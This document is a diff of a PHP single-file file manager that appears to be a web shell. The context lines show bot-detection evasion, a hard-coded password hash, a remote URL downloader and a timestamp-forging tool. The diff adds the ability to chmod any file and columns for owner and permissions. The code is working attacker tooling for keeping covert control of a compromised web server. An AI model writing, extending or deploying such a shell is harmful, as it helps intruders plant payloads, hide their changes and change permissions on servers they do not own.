@@ -1,6 +1,6 @@
 <?php
 session_start();
-define('APP_VER', '0.1');
+define('APP_VER', '0.2');
 $password = defined('PW') ? PW : '0192023a7bbd73250516f069df18b500';
 
 // Undetect bots
@@ -97,6 +97,12 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
                 if(move_uploaded_file($tmp,$path.'/'.basename($_FILES['files']['name'][$i]))) $ok++;
             $_SESSION['msg']= $ok.' file(s) uploaded'; $_SESSION['msg_type']='success';
         }
+        elseif (isset($_POST['update_perm']) && isset($_POST['perm_value'])) {
+            $file=$path.'/'.basename($_POST['update_perm']);
+            if(@chmod($file, octdec($_POST['perm_value']))){
+                $_SESSION['msg']='Permission updated'; $_SESSION['msg_type']='success';
+            } else $_SESSION['msg']='Update permission failed'; $_SESSION['msg_type']='error';
+        }
         elseif (isset($_POST['update_mtime'],$_POST['mtime_value'])){
             $file=$path.'/'.basename($_POST['update_mtime']);
             if(@touch($file, strtotime($_POST['mtime_value']))){
@@ -124,10 +130,13 @@ $files=scandir($path);
 $folders=[];$regular_files=[];
 foreach($files as $f){
     if($f=='.'||$f=='..')continue;
-    if($search && stripos($f,$search)===false) continue;
-    $fp=$path.'/'.$f; $mtime=filemtime($fp);
-    if(is_dir($fp)) $folders[]= ['name'=>$f,'mtime'=>$mtime];
-    else $regular_files[]= ['name'=>$f,'mtime'=>$mtime];
+    $fp=$path.'/'.$f;
+    $stat = stat($fp);
+    $owner= (function($uid){ $u=posix_getpwuid($uid); return $u?$u['name']:'?'; })($stat['uid']);
+    $group= (function($gid){ $g=posix_getgrgid($gid); return $g?$g['name']:'?'; })($stat['gid']);
+    $perm= substr(sprintf('%o', $stat['mode']), -3);
+    $item=['name'=>$f,'mtime'=>$stat['mtime'],'owner'=>$owner.':'.$group,'perm'=>$perm];
+    if(is_dir($fp)) $folders[]=$item; else $regular_files[]=$item;
 }
 
 // Sort
@@ -181,6 +190,7 @@ $(function(){
     $('.edit-btn').click(function(){ let f=$(this).data('file'); $('.edit-filename').text(f); $.post('',{get_content:f},d=>{$('#editModal textarea').val(d);$('#editModal input[name="edit_file"]').val(f);$('#editModal').removeClass('hidden');});});
     $('.delete-btn').click(function(){ $('#deleteModal input[name="delete"]').val($(this).data('file')); $('#deleteModal span').text($(this).data('file')); $('#deleteModal').removeClass('hidden');});
     $('.rename-btn').click(function(){ $('#renameModal input[name="rename_from"]').val($(this).data('file')); $('#renameModal input[name="rename_to"]').val($(this).data('file')); $('#renameModal').removeClass('hidden');});
+    $('.perm-btn').click(function(){ let f=$(this).data('file'); let p=$(this).data('perm'); $('#permModal input[name="update_perm"]').val(f); $('#permModal input[name="perm_value"]').val(p); $('#permModal span').text(f); $('#permModal').removeClass('hidden'); });
     $('.mtime-btn').click(function(){ let f=$(this).data('file'); let dt=$(this).data('mtime'); $('#mtimeModal input[name="update_mtime"]').val(f); $('#mtimeModal input[name="mtime_value"]').val(dt); $('#mtimeModal span').text(f); $('#mtimeModal').removeClass('hidden');});
     $('#showNewFile').click(()=>$('#newFileModal').removeClass('hidden'));
     $('#showNewFolder').click(()=>$('#newFolderModal').removeClass('hidden'));
@@ -269,12 +279,16 @@ $(function(){
     <table class="min-w-full bg-white border">
     <tr class="bg-gray-200">
     <th class="p-2 text-left"><a href="<?=sort_url('name',$sort,$order,$path,$search)?>" class="hover:underline">Name<?=($sort=='name'?($order=='asc'?' 🔼':' 🔽'):'')?></a></th>
+    <th class="p-2">Owner</th>
+    <th class="p-2">Perm</th>
     <th class="p-2"><a href="<?=sort_url('mtime',$sort,$order,$path,$search)?>" class="hover:underline">Last Modified<?=($sort=='mtime'?($order=='asc'?' 🔼':' 🔽'):'')?></a></th>
     <th class="p-2">Action</th></tr>
     <?php if($path != $parent): ?><tr class="border-t hover:bg-yellow-200 dark:hover:bg-gray-700"><td class="p-2"><a href="?path=<?=urlencode($parent)?>" class="text-blue-500">📁 ..</a></td><td class="p-2">-</td><td class="p-2">-</td></tr><?php endif; ?>
     <?php foreach(array_merge($folders,$regular_files) as $f):$fp=$path.'/'.$f['name'];$mtime=date('Y-m-d\TH:i',$f['mtime']); ?>
     <tr class="border-t hover:bg-yellow-200 dark:hover:bg-gray-700">
     <td class="p-2"><?php if(is_dir($fp)):?><a href="?path=<?=urlencode($fp)?>" class="text-blue-500">📁 <?=htmlspecialchars($f['name'])?></a><?php else:?>📄 <?=htmlspecialchars($f['name'])?><?php endif;?></td>
+    <td class="p-2"><?=htmlspecialchars($f['owner'])?></td>
+    <td class="p-2"><button data-file="<?=htmlspecialchars($f['name'])?>" data-perm="<?=htmlspecialchars($f['perm'])?>" class="perm-btn underline text-blue-500"><?=$f['perm']?></button></td>
     <td class="p-2"><button data-file="<?=htmlspecialchars($f['name'])?>" data-mtime="<?=$mtime?>" class="mtime-btn underline text-blue-500"><?=date('Y-m-d H:i',$f['mtime'])?></button></td>
     <td class="p-2 space-x-1"><?php if(!is_dir($fp)):?><button data-file="<?=htmlspecialchars($f['name'])?>" class="edit-btn bg-gray-300 px-2 rounded" title="Edit">📝</button><?php endif;?><button data-file="<?=htmlspecialchars($f['name'])?>" class="rename-btn bg-gray-300 px-2 rounded" title="Rename">✍🏼</button><button data-file="<?=htmlspecialchars($f['name'])?>" class="delete-btn bg-gray-300 px-2 rounded" title="Delete">🗑️</button></td></tr><?php endforeach;?>
     </table>
@@ -316,6 +330,12 @@ $(function(){
 <div id="downloaderModal" class="modal fixed inset-0 bg-gray-800 bg-opacity-75 hidden flex items-center justify-center">
 <div class="bg-white p-4 rounded"><form method="post"><p>URL Source:</p><input name="download_url" class="border px-2 mb-2 w-full"><p>Output Name:</p><input name="output_name" class="border px-2 mb-2 w-full"><p>Method:</p><select name="method" class="border px-2 mb-2 w-full"><option>file_get_contents</option><option>cURL</option><option>fopen</option><option>copy</option><option>stream_context</option></select>
 <div class="flex justify-between"><button class="bg-purple-500 text-white px-4 py-1 rounded">⬇️ Download</button><button type="button" class="close bg-gray-300 px-4 py-1 rounded">❌ Cancel</button></div></form></div></div>
+
+<div id="permModal" class="modal fixed inset-0 bg-gray-800 bg-opacity-75 hidden flex items-center justify-center">
+<div class="bg-white p-4 rounded"><form method="post"><input type="hidden" name="update_perm">
+<p>Edit Permission of <span class="font-bold"></span>:</p>
+<input name="perm_value" class="border px-2 mb-2" placeholder="e.g. 755">
+<div class="flex justify-between"><button class="bg-green-500 text-white px-4 py-1 rounded">🔧 Update</button><button type="button" class="close bg-gray-300 px-4 py-1 rounded">❌ Cancel</button></div></form></div></div>
 
 <footer class="container mx-auto p-4">
       <div class="flex flex-col sm:flex-row justify-between items-center pt-4 border-t border-gray-300">
